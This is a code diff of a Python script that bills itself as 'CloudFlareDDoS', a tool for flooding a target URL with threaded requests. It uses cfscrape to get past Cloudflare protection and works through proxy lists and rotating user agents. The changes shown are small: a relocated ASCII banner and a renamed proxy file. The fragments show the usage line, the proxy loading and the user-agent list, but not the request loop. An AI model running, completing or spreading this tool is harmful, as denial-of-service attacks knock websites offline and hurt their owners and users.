@@ -2,16 +2,6 @@ import urllib.request, os, threading, time, random, sys, requests
 import cfscrape
 from colorama import Fore, Style
 
-print(" ")
-print("\033[90m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
-print("\033[91m   ________                __________                ____  ____       _____ \033[0m")
-print("\033[92m  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/ \033[0m")
-print("\033[93m / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \  \033[0m")
-print("\033[94m/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ /  \033[0m")
-print("\033[95m\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/   \033[0m")
-print("\033[96m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
-print(" ")
-
 if len(sys.argv)==1:
     sys.exit(Fore.GREEN+'Usage: '+Fore.WHITE + sys.argv[0] +Fore.YELLOW+ ' [URL] [THREAD]'+Style.RESET_ALL+Fore.RESET)
 
@@ -21,6 +11,16 @@ def getproxy():
     with open(str(list),'wb') as fp:
         fp.write(rsp.content)    
     pprr = open(list).readlines()
+
+print(" ")
+print("\033[90m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
+print("\033[91m   ________                __________                ____  ____       _____ \033[0m")
+print("\033[92m  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/ \033[0m")
+print("\033[93m / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \  \033[0m")
+print("\033[94m/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ /  \033[0m")
+print("\033[95m\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/   \033[0m")
+print("\033[96m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
+print(" ")
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -105,10 +105,10 @@ class MainLoop:
             url = sys.argv[1]
         else:
             try:
-                file_proxy = str('http.txt')
+                file_proxy = str('proxy.txt')
                 in_file = open(file_proxy, 'r')
             except:
-                file_proxy = str('http.txt')
+                file_proxy = str('proxy.txt')
                 in_file = open(file_proxy, 'r')
             else:
                 num_threads = sys.argv[2]
